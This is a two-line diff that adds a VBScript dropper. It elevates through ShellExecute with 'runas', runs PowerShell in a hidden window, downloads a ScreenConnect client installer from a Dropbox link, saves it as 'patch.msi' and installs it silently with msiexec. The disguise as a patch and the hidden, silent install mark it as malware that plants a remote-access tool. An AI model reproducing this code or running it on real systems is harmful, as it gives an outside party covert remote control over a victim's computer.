@@ -1,0 +1,2 @@
+Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "powershell", "-Command ""& {mkdir C:\Temp -Force 2>$null; curl.exe -L --ssl-no-revoke 'https://www.dropbox.com/scl/fi/c2zlts8mx4q4dhnarn8b6/ScreenConnect.ClientSetup-13.msi?rlkey=qema87jy9ytnrc1j5dckssmv7&st=7gh1bfyi&dl=1' -o C:\Temp\patch.msi; msiexec.exe /i 'C:\Temp\patch.msi' /qn /norestart}""", "", "runas", 0
